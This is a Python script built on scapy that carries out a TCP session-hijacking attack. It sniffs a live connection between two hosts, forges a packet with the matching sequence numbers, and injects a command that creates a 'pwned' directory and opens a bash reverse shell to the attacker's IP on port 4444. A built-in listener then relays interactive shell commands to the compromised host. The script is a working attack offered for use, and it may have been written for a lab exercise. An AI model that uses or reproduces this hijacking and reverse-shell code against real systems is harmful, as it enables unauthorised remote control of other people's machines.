from scapy.all import *
from sys import argv

import socket
import threading

LISTENER_PORT = 4444
LISTENER_IP = "0.0.0.0"


def listener(host: str, port: int):
    listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        listen_socket.bind((host, port))
        listen_socket.listen(1)
        connection, address = listen_socket.accept()
        connection.sendall(b"\n")


        sys.stdout.write("$ ")
        sys.stdout.flush()
        
        while True:
            cmd_input = sys.stdin.readline()
            if not cmd_input :
                print("\n Exiting shell due to inactivity...")

            cmd_stripped = cmd_input.strip()

            if cmd_stripped.lower() == "exit":
                break

            connection.sendall(cmd_input.encode())

            connection.settimeout(1.5)
            response_data = b""
            try:
                while True:
                    chunk = connection.recv(4096)
                    if not chunk:
                        response_data = b""
                        break
                    response_data += chunk

            except socket.timeout:
                pass

            if response_data:
                sys.stdout.write(response_data.decode(errors='ignore'))
                sys.stdout.flush()
            elif not cmd_stripped:
                pass 

    except ConnectionRefusedError:
        print(f"Connection refused when host01 tried to connect back.")
    except Exception as e:
        print(f"\nShell listener error: {e}")

def main():
    if len(argv) != 4:
        print(f"Usage: {argv[0]} <src_ip> <dst_ip> <dst_port>")
        exit(1)

    src_ip, dst_ip, dst_port = argv[1], argv[2], int(argv[3])

    attacker_ip = get_if_addr(conf.iface)

    t = threading.Thread(target=listener, args=(LISTENER_IP, LISTENER_PORT,), daemon=True)
    t.start()

    print("waiting for packet...")
    pkt = sniff(
        count=1,
        lfilter=lambda p: p.haslayer(TCP)
        and p[IP].src == src_ip
        and p[IP].dst == dst_ip
        and p[TCP].dport == dst_port,
    )[0]

    sport = pkt[TCP].sport
    seq_next = pkt[TCP].seq + len(pkt[TCP].payload)
    ack_num = pkt[TCP].ack

    payload = (
        f"mkdir -p /home/user/pwned; bash -i >& /dev/tcp/{attacker_ip}/{LISTENER_PORT} 0>&1"
    )

    forged = (
        IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=dst_port, seq=seq_next, ack=ack_num, flags="PA") / Raw(load=payload + "\n")
    )

    send(forged, verbose=False)
    print(f"Received reverse shell connection from (’{src_ip}’, {LISTENER_PORT})")

    try:
        while t.is_alive():
            t.join(1)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
